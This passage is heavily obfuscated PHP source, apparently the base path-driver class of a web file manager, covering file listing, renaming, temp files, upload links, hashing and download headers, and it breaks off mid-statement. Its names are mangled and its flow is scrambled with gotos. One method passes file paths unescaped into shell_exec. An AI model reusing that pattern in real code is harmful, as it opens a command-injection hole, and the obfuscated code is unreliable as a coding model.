Model($FÎ—í¸Ç²[1774])->field($FÎ—í¸Ç²[1529])->where(array($FÎ—í¸Ç²[1693] => array($FÎ—í¸Ç²[7], $AÑ¯‹‡Ùà)))->select(); $BË¶¾ßÒã² = array_to_keyvalue($BË¶¾ßÒã², $FÎ—í¸Ç²[33], $FÎ—í¸Ç²[1529]); return array_unique($BË¶¾ßÒã²); } public function userSearch($D©ÏŞ¿Íî¾, $b¾ö¥‘Ü§Ÿ = "\x2a") { return Model($_SERVER[Ü˜][515])->where($D©ÏŞ¿Íî¾)->field($b¾ö¥‘Ü§Ÿ)->find(); } } goto dÉ•®ÛÀ; D†è’­˜…’: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $c‰¡Ú¨éÎ£ =& $_SERVER[Ü˜]; $this->objectDriver = array($c‰¡Ú¨éÎ£[67], $c‰¡Ú¨éÎ£[68], $c‰¡Ú¨éÎ£[69], $c‰¡Ú¨éÎ£[70], $c‰¡Ú¨éÎ£[71], $c‰¡Ú¨éÎ£[72], $c‰¡Ú¨éÎ£[73], $c‰¡Ú¨éÎ£[74], $c‰¡Ú¨éÎ£[75]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($eì¿õ±±ß) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($eì¿õ±±ß, $_SERVER[Ü˜][8]); } return $eì¿õ±±ß; } public function iconvApp($f¼¬¼Íø‹) { return $f¼¬¼Íø‹; } public function iconvSystem($cÛ‰ššßÃÍ) { return $cÛ‰ššßÃÍ; } public function iconvTo($f¹ÜÜùÕù·, $Fá„ŸÄøÅ«, $B·ŠÀùÂ÷) { goto DÇˆÏ‘‚; d®¤¤Ë…ç…: return $bŠ½Ï—í; goto FçáîŠ½³; C ğ‡¨‹®ï: $b¥È¸òĞËµ = $Fá„ŸÄøÅ« . $e¡¦Îß¡Œ[77] . $B·ŠÀùÂ÷ . $e¡¦Îß¡Œ[78] . $f¹ÜÜùÕù·; if (isset($eËåˆËŞ·[$b¥È¸òĞËµ])) { return $eËåˆËŞ·[$b¥È¸òĞËµ]; } if (function_exists($e¡¦Îß¡Œ[79])) { $bŠ½Ï—í = @mb_convert_encoding($f¹ÜÜùÕù·, $B·ŠÀùÂ÷, $Fá„ŸÄøÅ«); } else { $bŠ½Ï—í = @iconv($Fá„ŸÄøÅ«, $B·ŠÀùÂ÷, $f¹ÜÜùÕù·); } goto D«·øàº¨¯; DÇˆÏ‘‚: $e¡¦Îß¡Œ =& $_SERVER[Ü˜]; if (!$f¹ÜÜùÕù· || !function_exists($e¡¦Îß¡Œ[76])) { return $f¹ÜÜùÕù·; } static $eËåˆËŞ· = array(); goto C ğ‡¨‹®ï; bá„×½å×: $eËåˆËŞ·[$B·ŠÀùÂ÷ . $e¡¦Îß¡Œ[77] . $Fá„ŸÄøÅ« . $e¡¦Îß¡Œ[78] . $f¹ÜÜùÕù·] = $f¹ÜÜùÕù·; $eËåˆËŞ·[$B·ŠÀùÂ÷ . $e¡¦Îß¡Œ[77] . $Fá„ŸÄøÅ« . $e¡¦Îß¡Œ[78] . $bŠ½Ï—í] = $f¹ÜÜùÕù·; $eËåˆËŞ·[$Fá„ŸÄøÅ« . $e¡¦Îß¡Œ[77] . $B·ŠÀùÂ÷ . $e¡¦Îß¡Œ[78] . $bŠ½Ï—í] = $bŠ½Ï—í; goto d®¤¤Ë…ç…; D«·øàº¨¯: $bŠ½Ï—í = $bŠ½Ï—í ? $bŠ½Ï—í : $f¹ÜÜùÕù·; if (strstr($bŠ½Ï—í, $e¡¦Îß¡Œ[80])) { $bŠ½Ï—í = str_replace($e¡¦Îß¡Œ[80], $e¡¦Îß¡Œ[81], $bŠ½Ï—í); } $eËåˆËŞ·[$Fá„ŸÄøÅ« . $e¡¦Îß¡Œ[77] . $B·ŠÀùÂ÷ . $e¡¦Îß¡Œ[78] . $f¹ÜÜùÕù·] = $bŠ½Ï—í; goto bá„×½å×; FçáîŠ½³: } public function getPathInner($E‰†—†÷Í) { $E°‹Îã· = IO::init($E‰†—†÷Í); return $E°‹Îã·->path; } public function getPathOuter($e“Ìå“©«£) { $cˆ„°Æâ¬ =& $_SERVER[Ü˜]; $E¬‡£¦ÉÄ = strlen(trim($this->pathBase, $cˆ„°Æâ¬[8])); $e“Ìå“©«£ = substr(trim($e“Ìå“©«£, $cˆ„°Æâ¬[8]), $E¬‡£¦ÉÄ); return $this->pathDriver . $cˆ„°Æâ¬[8] . ltrim($e“Ìå“©«£, $cˆ„°Æâ¬[8]); } public function isParentOf($BÔäõ‡¢ÜÅ, $Eƒ÷Â‘ÒÏŒ) { $Cã¶œŒÅÙ =& $_SERVER[Ü˜]; $BÔäõ‡¢ÜÅ = rtrim(strtolower($BÔäõ‡¢ÜÅ), $Cã¶œŒÅÙ[8]) . $Cã¶œŒÅÙ[8]; $Eƒ÷Â‘ÒÏŒ = rtrim(strtolower($Eƒ÷Â‘ÒÏŒ), $Cã¶œŒÅÙ[8]) . $Cã¶œŒÅÙ[8]; $B˜Ó´âÔÌ = strpos($Eƒ÷Â‘ÒÏŒ, $BÔäõ‡¢ÜÅ) === 0; return $B˜Ó´âÔÌ; } public function getType() { $f±Îù áÁ© =& $_SERVER[Ü˜]; $dƒÅÕ®óà³ = str_replace($f±Îù áÁ©[82], $f±Îù áÁ©[33], get_class($this)); return strtolower($dƒÅÕ®óà³); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($d§…ãÖÔÔĞ, $e®æô·˜¯¶) { $A‚¤®ÁÔ“ =& $_SERVER[Ü˜]; $Aºò¦Ç«¨Ñ = rtrim($d§…ãÖÔÔĞ, $A‚¤®ÁÔ“[8]) . $A‚¤®ÁÔ“[8] . $e®æô·˜¯¶; $aåÙ‚–œ‡Ô = $this->exist($Aºò¦Ç«¨Ñ); return $aåÙ‚–œ‡Ô ? $Aºò¦Ç«¨Ñ : !1; } public function setModifyTime($a­îº…„¿Û, $eÊ¨¢¼˜‡ = '') { } public function renameObject($càùç‘ÕÈš, $a¹™†‡©¿) { goto e¤ÏğÆà¡ï; b•ˆğÕ²½¤: return $A–·áóõÏ± ? $a¹™†‡©¿ : !1; goto AöØ‘Ş¢³; e¤ÏğÆà¡ï: $fçõ¼ˆ·ƒ =& $_SERVER[Ü˜]; $dĞÌæ«ãŠó = $a¹™†‡©¿; Hook::trigger($fçõ¼ˆ·ƒ[83], $this, $càùç‘ÕÈš, $this, $this->pathFather($càùç‘ÕÈš) . $a¹™†‡©¿); goto f´Õ­ÓÈÁ; f´Õ­ÓÈÁ: $càùç‘ÕÈš = $this->getPathOuter($càùç‘ÕÈš); $a¹™†‡©¿ = $this->pathFather($càùç‘ÕÈš) . $a¹™†‡©¿; if (IO::isFile($càùç‘ÕÈš)) { $A–·áóõÏ± = IO::copy($càùç‘ÕÈš, $this->pathFather($càùç‘ÕÈš), REPEAT_RENAME_FOLDER, $dĞÌæ«ãŠó); if ($A–·áóõÏ±) { IO::remove($càùç‘ÕÈš); } } else { $A–·áóõÏ± = IO::mkdir($a¹™†‡©¿); if (!$A–·áóõÏ±) { return !1; } $F©ÌÃáå± = IO::listPath($càùç‘ÕÈš, !0); $e’ÚÎ„¾¥ò = array_merge($F©ÌÃáå±[$fçõ¼ˆ·ƒ[84]], $F©ÌÃáå±[$fçõ¼ˆ·ƒ[85]]); foreach ($e’ÚÎ„¾¥ò as $B øÙ¤ôà) { IO::move($B øÙ¤ôà[$fçõ¼ˆ·ƒ[86]], $a¹™†‡©¿, REPEAT_RENAME_FOLDER); } IO::remove($càùç‘ÕÈš); } goto b•ˆğÕ²½¤; AöØ‘Ş¢³: } public function tempFile($Cíëğ¥ƒ¡ = '', $eƒª‰´Æö£ = '') { goto AÒµƒÛêÒÈ; cê”Û‚º†‘: $E’ì’öÓ›¤ = $DæË‡Á¸³± . $Cíëğ¥ƒ¡; @touch($E’ì’öÓ›¤); if ($eƒª‰´Æö£) { file_put_contents($E’ì’öÓ›¤, $eƒª‰´Æö£); } goto B÷³Ì¿¶³«; B÷³Ì¿¶³«: return $E’ì’öÓ›¤; goto Eåï‚óÛİò; AÒµƒÛêÒÈ: if (!$Cíëğ¥ƒ¡) { $Cíëğ¥ƒ¡ = rand_string(15); } $DæË‡Á¸³± = TEMP_FILES . rand_string(15) . $_SERVER[Ü˜][8]; @mkdir($DæË‡Á¸³±, 511, !0); goto cê”Û‚º†‘; Eåï‚óÛİò: } public function tempFileRemve($F×†À™İ‰·) { @unlink($F×†À™İ‰·); @rmdir($this->pathFather($F×†À™İ‰·)); } public function mkfile($FÍæ³•ŠŠ¤, $Eèåí®ŸÖ = '', $A‚•÷›«óÕ = REPEAT_RENAME) { } public function mkdir($eæ»±ÓŠÆ, $Eô©¬Ó¦ˆŒ = REPEAT_SKIP) { } public function delFile($Fã¸Ê†éÛì) { } public function delFolder($DÌŸ…ÀöğÂ) { } public function copyFile($f‹ŒŠàŸ„, $bóô×ˆ…ÊÁ) { } public function moveFile($Aª†êìô†ñ, $cƒ»İ…¡Âä) { } public function remove($f¹Şò’›ñ) { if ($this->isFile($f¹Şò’›ñ)) { return $this->delFile($f¹Şò’›ñ); } return $this->delFolder($f¹Şò’›ñ); } public function rename($Aš‚³»ÈÏĞ, $Bƒ›•ĞÍÔ„) { } public function exist($dêòºŒ‹šò) { } public function findByHash($D “»Í‹Ÿ÷ = '', $F·àĞ‹Âµ = '') { return !1; } public function isFile($c±â¥Åƒ³¡) { } public function isFolder($E‚Õˆëœ‹) { } public function size($e«Şñ°´‰») { } public function info($BÏæ½Íìáù) { } public function infoSimple($C®®¸ÓİŒÖ) { return $this->info($C®®¸ÓİŒÖ); } public function infoAuth($F¢í–óŠá³) { return $this->info($F¢í–óŠá³); } public function infoFull($B©¾šâÛ‘) { return $this->info($B©¾šâÛ‘); } public function infoWithChildren($eÍ÷„å–á“) { $Eø™ÄùæÒ =& $_SERVER[Ü˜]; static $b„ôè¿ò¾‚ = array(); if (isset($b„ôè¿ò¾‚[$eÍ÷„å–á“])) { return $b„ôè¿ò¾‚[$eÍ÷„å–á“]; } $FæÊ…´£Â¹ = $this->info($eÍ÷„å–á“); if ($FæÊ…´£Â¹ && $FæÊ…´£Â¹[$Eø™ÄùæÒ[29]] == $Eø™ÄùæÒ[87]) { $EƒñÅˆšŒæ = array($Eø™ÄùæÒ[88] => 0, $Eø™ÄùæÒ[89] => 0, $Eø™ÄùæÒ[90] => 0); $this->infoChildren($eÍ÷„å–á“, $EƒñÅˆšŒæ); $FæÊ…´£Â¹[$Eø™ÄùæÒ[88]] = $EƒñÅˆšŒæ[$Eø™ÄùæÒ[88]]; $FæÊ…´£Â¹[$Eø™ÄùæÒ[91]] = array($Eø™ÄùæÒ[92] => $EƒñÅˆšŒæ[$Eø™ÄùæÒ[89]], $Eø™ÄùæÒ[93] => $EƒñÅˆšŒæ[$Eø™ÄùæÒ[90]]); $b„ôè¿ò¾‚[$eÍ÷„å–á“] = $FæÊ…´£Â¹; } return $FæÊ…´£Â¹; } public function listPath($E±ŒëŒùáÙ, $D„Çâ¯ÃÚ„ = false) { } public function has($B‘ÀùÂÖ…–, $B®É¨µ’ = false, $Fù‰ÀóÖ”Œ = false) { } public function canRead($dƒàÙ—±ê) { } public function canWrite($aíÊøë“Ê) { } public function getContent($CÌÓ×‡”) { } public function setContent($D¥ÑøòÊÓ‹, $c²ÑâÀç†™ = '') { } protected function infoChildren($D¿½­—¹ƒä, &$C»Ñê„ËÀŸ) { $FÑÌ»êÂµä =& $_SERVER[Ü˜]; check_abort_echo(); $b¾ğ’É¾ËÔ = $this->listPath($D¿½­—¹ƒä, !0); $b¾ğ’É¾ËÔ = array_merge($b¾ğ’É¾ËÔ[$FÑÌ»êÂµä[85]], $b¾ğ’É¾ËÔ[$FÑÌ»êÂµä[84]]); foreach ($b¾ğ’É¾ËÔ as $eƒ«’ãªä±) { if ($eƒ«’ãªä±[$FÑÌ»êÂµä[29]] == $FÑÌ»êÂµä[87]) { $C»Ñê„ËÀŸ[$FÑÌ»êÂµä[90]]++; $DÇˆ¶˜à‡ = $this->getPathInner($eƒ«’ãªä±[$FÑÌ»êÂµä[86]]); $this->infoChildren($DÇˆ¶˜à‡, $C»Ñê„ËÀŸ); } else { $C»Ñê„ËÀŸ[$FÑÌ»êÂµä[89]]++; $C»Ñê„ËÀŸ[$FÑÌ»êÂµä[88]] += $eƒ«’ãªä±[$FÑÌ»êÂµä[88]]; } } } public function fileSubstr($e´¾Ê÷ïÄ¼, $DÒ»í‡šÑÑ, $f’õ§Ã¾³Ä) { } public function listAll($CÑÃØ¶ØÑ) { } public function listAllMake($dËìŸó¡Ñ, &$A‹ØŒ©ï©Ù) { $aõÈøÉàÉ› =& $_SERVER[Ü˜]; check_abort_echo(); $A¿ÄäØÊéÜ = $this->listPath($dËìŸó¡Ñ, !0); if (!$A¿ÄäØÊéÜ) { return; } $CË£®©ºÑ± = array_merge($A¿ÄäØÊéÜ[$aõÈøÉàÉ›[85]], $A¿ÄäØÊéÜ[$aõÈøÉàÉ›[84]]); foreach ($CË£®©ºÑ± as $E«„©éâ¨) { goto d”Ø§ò…Â; fòÕÉÜíÄš: $this->listAllMake($E«„©éâ¨[$aõÈøÉàÉ›[86]], $A‹ØŒ©ï©Ù); goto cŸ¾›‰…ö; d”Ø§ò…Â: $DöãˆÖºå = $E«„©éâ¨[$aõÈøÉàÉ›[29]] == $aõÈøÉàÉ›[87]; $B–’òØÖ¾Â = array($aõÈøÉàÉ›[86] => $E«„©éâ¨[$aõÈøÉàÉ›[86]], $aõÈøÉàÉ›[87] => $DöãˆÖºå); if (isset($E«„©éâ¨[$aõÈøÉàÉ›[88]])) { $B–’òØÖ¾Â[$aõÈøÉàÉ›[88]] = $E«„©éâ¨[$aõÈøÉàÉ›[88]]; } goto eª˜Ò …„; eª˜Ò …„: if (isset($E«„©éâ¨[$aõÈøÉàÉ›[94]])) { $B–’òØÖ¾Â[$aõÈøÉàÉ›[94]] = $E«„©éâ¨[$aõÈøÉàÉ›[94]]; } if (!$DöãˆÖºå) { $A‹ØŒ©ï©Ù[] = $B–’òØÖ¾Â; continue; } $A‹ØŒ©ï©Ù[] = $B–’òØÖ¾Â; goto fòÕÉÜíÄš; cŸ¾›‰…ö: } } public function listAllSimple($BË¹Ü«ëä) { $EäöÌé¦í =& $_SERVER[Ü˜]; $F¼„ééñ = array(); $B¹ËéÊ›òÎ = $this->listAll($BË¹Ü«ëä); $AÓ÷ïÁÇÀÅ = $this->getPathOuter($BË¹Ü«ëä); foreach ($B¹ËéÊ›òÎ as $dîËĞöƒç) { goto BàßŒË‰Î…; a¹Â»ÖÆÉ: if (!$dîËĞöƒç[$EäöÌé¦í[87]]) { $Eâ÷ğÎ¨ñ§[$EäöÌé¦í[96]] = $dÚÌâµÈ“Ó; } $F¼„ééñ[] = $Eâ÷ğÎ¨ñ§; goto F¼Ú¹Ùİ¯¨; BàßŒË‰Î…: $dÚÌâµÈ“Ó = $dîËĞöƒç[$EäöÌé¦í[86]]; $FÊÂ¦òÇÚà = $dîËĞöƒç[$EäöÌé¦í[86]]; if (isset($dîËĞöƒç[$EäöÌé¦í[95]])) { $dÚÌâµÈ“Ó = $dîËĞöƒç[$EäöÌé¦í[95]][$EäöÌé¦í[86]]; $dîËĞöƒç[$EäöÌé¦í[88]] = $dîËĞöƒç[$EäöÌé¦í[95]][$EäöÌé¦í[88]]; $dîËĞöƒç[$EäöÌé¦í[94]] = $dîËĞöƒç[$EäöÌé¦í[95]][$EäöÌé¦í[94]]; } else { $FÊÂ¦òÇÚà = substr($dîËĞöƒç[$EäöÌé¦í[86]], strlen(get_path_father($AÓ÷ïÁÇÀÅ))); $FÊÂ¦òÇÚà = $EäöÌé¦í[8] . ltrim($FÊÂ¦òÇÚà, $EäöÌé¦í[8]); } goto C†ã›¯Ø¬±; C†ã›¯Ø¬±: $Eâ÷ğÎ¨ñ§ = array($EäöÌé¦í[86] => $FÊÂ¦òÇÚà, $EäöÌé¦í[87] => $dîËĞöƒç[$EäöÌé¦í[87]]); if (isset($dîËĞöƒç[$EäöÌé¦í[88]]) && !$dîËĞöƒç[$EäöÌé¦í[87]]) { $Eâ÷ğÎ¨ñ§[$EäöÌé¦í[88]] = $dîËĞöƒç[$EäöÌé¦í[88]]; } if (isset($dîËĞöƒç[$EäöÌé¦í[94]])) { $Eâ÷ğÎ¨ñ§[$EäöÌé¦í[94]] = $dîËĞöƒç[$EäöÌé¦í[94]]; } goto a¹Â»ÖÆÉ; F¼Ú¹Ùİ¯¨: } return $F¼„ééñ; } public function upload($A¿Î¾ùŸ, $BÙï’ÒÀŠì, $bœíÃ»±« = false, $a¿ˆÑ©±«ä = REPEAT_REPLACE) { } public function uploadFileByID($a¸÷ˆø†ÛÜ, $FˆéŒĞÈáİ, $fÉ’¯‰À) { } public function uploadFileByPath($BÌ¾Šˆ‰‘‚, $CŒ´ËŒá÷, $aÅ´ÌÂœ¾´ = array()) { } public function isUploadServer() { $AË÷„‹ñÙ =& $_SERVER[Ü˜]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $AË÷„‹ñÙ[97]) { return !0; } return $GLOBALS[$AË÷„‹ñÙ[6]][$AË÷„‹ñÙ[98]][$AË÷„‹ñÙ[99]]; } public function isFileOutServer() { $EŠ‘¼„¹Ğ´ =& $_SERVER[Ü˜]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $EŠ‘¼„¹Ğ´[97]) { return !0; } return $GLOBALS[$EŠ‘¼„¹Ğ´[6]][$EŠ‘¼„¹Ğ´[98]][$EŠ‘¼„¹Ğ´[100]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÌËÍ• è¹) { $b°…ÕŠŒÔ² =& $_SERVER[Ü˜]; if (!$this->isCdnHost()) { return $cÌËÍ• è¹; } return str_replace(trim(get_url_root($cÌËÍ• è¹), $b°…ÕŠŒÔ²[8]), trim($this->cdnHost, $b°…ÕŠŒÔ²[8]), $cÌËÍ• è¹); } public function uploadLink($b–ù‚®•, $Fğî âªÎº = 0) { goto bÄÌÒÄÏÁ; c‰¥îƒ’êÎ: if (!in_array($c––Ùá’Õø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $c÷êÓö Œ™ = 1024 * 1024 * 10; goto E¦«ããğò»; E¦«ããğò»: $Aß¨»„Ñ¤  = $Fğî âªÎº <= $c÷êÓö Œ™ ? $eáª™ô¥ï—[101] : $eáª™ô¥ï—[102]; $FˆœÛ¸Ö Ö = (!$Fğî âªÎº ? 1 : ceil($Fğî âªÎº / pow(1024, 3))) * 3600 * 4; $CİÉÜÁ¸‰¶ = $this->{$Aß¨»„Ñ¤ }($b–ù‚®•, $FˆœÛ¸Ö Ö); goto EŠš¿ÕØ; EŠš¿ÕØ: if ($CİÉÜÁ¸‰¶) { $CİÉÜÁ¸‰¶[$eáª™ô¥ï—[103]] = $b–ù‚®•; $CİÉÜÁ¸‰¶[$eáª™ô¥ï—[104]] = $c––Ùá’Õø; } return $CİÉÜÁ¸‰¶; goto E½³ç³è‹‘; bÄÌÒÄÏÁ: $eáª™ô¥ï— =& $_SERVER[Ü˜]; if ($this->isUploadServer()) { return; } $c––Ùá’Õø = $this->getType(); goto c‰¥îƒ’êÎ; E½³ç³è‹‘: } public function uploadFormData($aÑ‹—£Ó¨, $C­Ğ¥›ê’ = 3600) { } public function multiUploadFormData($E´ÂÔ‚ÁÈ, $BÉì¾»Òï = 3600) { } public function download($F¡á¿‰ñ¼Õ, $AÂµóßÜ) { } public function ext($c«íÃ¾”ğƒ) { $A¯ã¯éŠîñ =& $_SERVER[Ü˜]; if (strpos($c«íÃ¾”ğƒ, $A¯ã¯éŠîñ[8]) === -1) { $AÛÆéŠÔŸĞ = $c«íÃ¾”ğƒ; } else { $AÛÆéŠÔŸĞ = $this->pathThis($c«íÃ¾”ğƒ); } $e±Ùö„‹è« = $A¯ã¯éŠîñ[33]; if (strstr($AÛÆéŠÔŸĞ, $A¯ã¯éŠîñ[105])) { $e±Ùö„‹è« = substr($AÛÆéŠÔŸĞ, strrpos($AÛÆéŠÔŸĞ, $A¯ã¯éŠîñ[105]) + 1); $e±Ùö„‹è« = strtolower($e±Ùö„‹è«); } if (strlen($e±Ùö„‹è«) > 3 && preg_match($A¯ã¯éŠîñ[106], $e±Ùö„‹è«, $cëãÔÉİ¯®)) { $e±Ùö„‹è« = $A¯ã¯éŠîñ[33]; } return $e±Ùö„‹è«; } public function pathThis($cÍäÍèƒ¬) { $bœÎÅ¿ôÁË =& $_SERVER[Ü˜]; $cÍäÍèƒ¬ = str_replace($bœÎÅ¿ôÁË[107], $bœÎÅ¿ôÁË[8], rtrim($cÍäÍèƒ¬, $bœÎÅ¿ôÁË[8])); $DˆÙø¹¶Ë¤ = strrpos($cÍäÍèƒ¬, $bœÎÅ¿ôÁË[8]); if ($DˆÙø¹¶Ë¤ === !1) { return $cÍäÍèƒ¬; } return substr($cÍäÍèƒ¬, $DˆÙø¹¶Ë¤ + 1); } public function pathFather($bİæÓæ‘«) { $dô°©é˜ãõ =& $_SERVER[Ü˜]; $bİæÓæ‘« = str_replace($dô°©é˜ãõ[107], $dô°©é˜ãõ[8], rtrim($bİæÓæ‘«, $dô°©é˜ãõ[8])); $b¦Ø¿‹¡–å = strrpos($bİæÓæ‘«, $dô°©é˜ãõ[8]); if ($b¦Ø¿‹¡–å === !1) { return $dô°©é˜ãõ[33]; } return substr($bİæÓæ‘«, 0, $b¦Ø¿‹¡–å + 1); } public function hashSimple($d»Ï­µ‡½ˆ) { goto fôŠ¿®î¼æ; F‰”‰¨êåá: $f‰¦Ÿâ¹ .= $this->fileSubstr($d»Ï­µ‡½ˆ, $E¥Ûƒ„Ó£Â - $DÖ¨ªó„ƒÂ, $DÖ¨ªó„ƒÂ); return md5($f‰¦Ÿâ¹) . $E¥Ûƒ„Ó£Â; goto D©­è–íçĞ; B“Ê­®ß­: $DÖ¨ªó„ƒÂ = 200; $F¶ƒÑ¢ˆæ = 50; if ($E¥Ûƒ„Ó£Â <= $DÖ¨ªó„ƒÂ * $F¶ƒÑ¢ˆæ) { return $this->hashMd5($d»Ï­µ‡½ˆ) . $E¥Ûƒ„Ó£Â; } goto C‘Ø™«×‹†; C‘Ø™«×‹†: $b¦ÔÅãì¼ = intval($E¥Ûƒ„Ó£Â / $F¶ƒÑ¢ˆæ); $f‰¦Ÿâ¹ = $eŸñ‡ˆˆ“[33]; for ($ağ‹©øÄ§¢ = 0; $ağ‹©øÄ§¢ < $F¶ƒÑ¢ˆæ; $ağ‹©øÄ§¢++) { $f‰¦Ÿâ¹ .= $this->fileSubstr($d»Ï­µ‡½ˆ, $b¦ÔÅãì¼ * $ağ‹©øÄ§¢, $DÖ¨ªó„ƒÂ); } goto F‰”‰¨êåá; fôŠ¿®î¼æ: $eŸñ‡ˆˆ“ =& $_SERVER[Ü˜]; if (!$d»Ï­µ‡½ˆ) { return md5($eŸñ‡ˆˆ“[33]); } $E¥Ûƒ„Ó£Â = $this->size($d»Ï­µ‡½ˆ); goto B“Ê­®ß­; D©­è–íçĞ: } public static $md5Cache = array(); public function hashMd5($AšÙÕíŠ¡) { $AšÙÕíŠ¡ = $this->iconvSystem($AšÙÕíŠ¡); if (isset(self::$md5Cache[$AšÙÕíŠ¡])) { return self::$md5Cache[$AšÙÕíŠ¡]; } self::$md5Cache[$AšÙÕíŠ¡] = $this->hashMd5Shell($AšÙÕíŠ¡); if (!self::$md5Cache[$AšÙÕíŠ¡]) { self::$md5Cache[$AšÙÕíŠ¡] = @md5_file($AšÙÕíŠ¡); } return self::$md5Cache[$AšÙÕíŠ¡]; } private function hashMd5Shell($F„ÓšÀÏ“) { goto a…ˆ†Àù’Á; E—’ä¢œŒÉ: $f†áõĞƒ‡Î = shell_exec($A‰‰š‰±ÈÅ . "\x20\42{$F„ÓšÀÏ“}\42"); $f†áõĞƒ‡Î = str_replace($c²É¥‘‘‡ù[114], $c²É¥‘‘‡ù[33], $f†áõĞƒ‡Î); return substr($f†áõĞƒ‡Î, 0, 32); goto aì‚ò¢î»; a…ˆ†Àù’Á: $c²É¥‘‘‡ù =& $_SERVER[Ü˜]; if (!function_exists($c²É¥‘‘‡ù[108])) { return !1; } $E´‚İæì÷‡ = array($c²É¥‘‘‡ù[109], $c²É¥‘‘‡ù[110]); goto Fğæ¸“›ÛÆ; Fğæ¸“›ÛÆ: $A‰‰š‰±ÈÅ = Cache::get($c²É¥‘‘‡ù[111]); if (!$A‰‰š‰±ÈÅ) { $Aßô®µ­ˆ = BASIC_PATH . $c²É¥‘‘‡ù[112]; $A¹ğØšï… = md5_file($Aßô®µ­ˆ); $A‰‰š‰±ÈÅ = $c²É¥‘‘‡ù[113]; foreach ($E´‚İæì÷‡ as $cæØê¿¼¦÷) { $f†áõĞƒ‡Î = shell_exec($cæØê¿¼¦÷ . "\40\42{$Aßô®µ­ˆ}\42"); if ($f†áõĞƒ‡Î && substr(trim($f†áõĞƒ‡Î), 0, 32) == $A¹ğØšï…) { $A‰‰š‰±ÈÅ = $cæØê¿¼¦÷; break; } } Cache::set($c²É¥‘‘‡ù[111], $A‰‰š‰±ÈÅ, 3600); } if ($A‰‰š‰±ÈÅ == $c²É¥‘‘‡ù[113]) { return !1; } goto E—’ä¢œŒÉ; aì‚ò¢î»: } public function link($d¼¯ö·Ç) { return $d¼¯ö·Ç; } public function fileOut($cç‚ÔÀãÅÛ, $a¬Õ”¼ Ùë = false, $DíÑ»¦‰„ = false, $cÃƒï³¸êÁ = '') { goto AÉâà’Ÿöµ; E‰¾Š‹‰Â†: $cœ‡á†ÊÎ‹ = strtolower($_SERVER[$Cµ‚íö­»Ò[152]]); if ($Añ‹Ü©øò÷ && $cœ‡á†ÊÎ‹ && $fªÍÅÔ»’Õ) { if (strstr($cœ‡á†ÊÎ‹, $Cµ‚íö­»Ò[153])) { header($Cµ‚íö­»Ò[154] . $cç‚ÔÀãÅÛ); } else { if (strstr($cœ‡á†ÊÎ‹, $Cµ‚íö­»Ò[155])) { header($Cµ‚íö­»Ò[156] . $cç‚ÔÀãÅÛ); } else { if (strstr($cœ‡á†ÊÎ‹, $Cµ‚íö­»Ò[157])) { header($Cµ‚íö­»Ò[158] . $cç‚ÔÀãÅÛ); } } } if ($BÅ±‡±á¢) { header($Cµ‚íö­»Ò[159] . $BÅ±‡±á¢); } return; } if (isset($_SERVER[$Cµ‚íö­»Ò[160]])) { if (preg_match($Cµ‚íö­»Ò[161], $_SERVER[$Cµ‚íö­»Ò[160]], $fˆéÂ¼Ø¸›)) { $E´ö¢äîÓõ = intval($fˆéÂ¼Ø¸›[1]); if (!empty($fˆéÂ¼Ø¸›[2])) { $Bíª·Ë…±ö = intval($fˆéÂ¼Ø¸›[2]); } } header($Cµ‚íö­»Ò[162]); header("\103\x6f\x6e\164\x65\156\164\x2d\122\x61\x6e\x67\x65\x3a\40\x62\x79\164\x65\163\x20{$E´ö¢äîÓõ}\55{$Bíª·Ë…±ö}\57" . $eØ‰ÀÂÅÔ´); } else { header($Cµ‚íö­»Ò[163]); } goto Fã¶ß¬‚÷; AÉâà’Ÿöµ: $Cµ‚íö­»Ò =& $_SERVER[Ü˜]; $this->cacheMethod(null, null); if (!$cç‚ÔÀãÅÛ || !$this->exist($cç‚ÔÀãÅÛ)) { show_json(LNG($Cµ‚íö­»Ò[115]), !1, $DíÑ»¦‰„); } goto BéŸÄÕÇ’; Cè«ëÅˆ¹: if (isset($_SERVER[$Cµ‚íö­»Ò[141]]) && strtotime($_SERVER[$Cµ‚íö­»Ò[141]]) == $BŒÖÑíŸìé[$Cµ‚íö­»Ò[94]]) { header($Cµ‚íö­»Ò[142], !0, 304); die; } if (isset($_SERVER[$Cµ‚íö­»Ò[143]]) && $_SERVER[$Cµ‚íö­»Ò[143]] == $cÃƒï³¸êÁ) { header($Cµ‚íö­»Ò[144] . $cÃƒï³¸êÁ, !0, 304); die; } header($Cµ‚íö­»Ò[144] . $cÃƒï³¸êÁ); goto CÍ› Ã´©; A É Í¼‹–: @ob_end_clean(); set_timeout(); $BŒÖÑíŸìé = $this->infoFull($cç‚ÔÀãÅÛ); goto Eâ„ãÍå®à; a†”•ö´õ²: if ($_SERVER[$Cµ‚íö­»Ò[167]] == $Cµ‚íö­»Ò[168]) { return; } $D´½ˆßòá = 1024 * 100; $cÜÏÚ©¬‹Ô = 0; goto Bª¶±§Ñ§š; C´¿Œ†í…Ï: $E´ö¢äîÓõ = 0; $Bíª·Ë…±ö = $eØ‰ÀÂÅÔ´ - 1; $e¤‹Œ‘íº = $this->ext($B¨ñÄ˜µìÁ); goto ešÅ¯”ìğí; FŞ—©“íÃí: $CÍ¢Í§ßĞâ = $Cµ‚íö­»Ò[126] . $CÍ¢Í§ßĞâ . $Cµ‚íö­»Ò[132] . $CÍ¢Í§ßĞâ; if ($a¬Õ”¼ Ùë) { header($Cµ‚íö­»Ò[133]); header($Cµ‚íö­»Ò[134] . $CÍ¢Í§ßĞâ); } else { header($Cµ‚íö­»Ò[135] . $CÍ¢Í§ßĞâ); } header($Cµ‚íö­»Ò[136] . gmdate($Cµ‚íö­»Ò[120], time() + 3600 * 24 * 30) . $Cµ‚íö­»Ò[137]); goto D±ˆÎéâ; CİÂ÷‡§›: header($Cµ‚íö­»Ò[148] . $eØ‰ÀÂÅÔ´); header($Cµ‚íö­»Ò[149]); if (!$a¬Õ”¼ Ùë && $e¤‹Œ‘íº == $Cµ‚íö­»Ò[150]) { if ($eØ‰ÀÂÅÔ´ > 1024 * 1024 * 5) { die; } $eØ˜ãÖëå¤ = 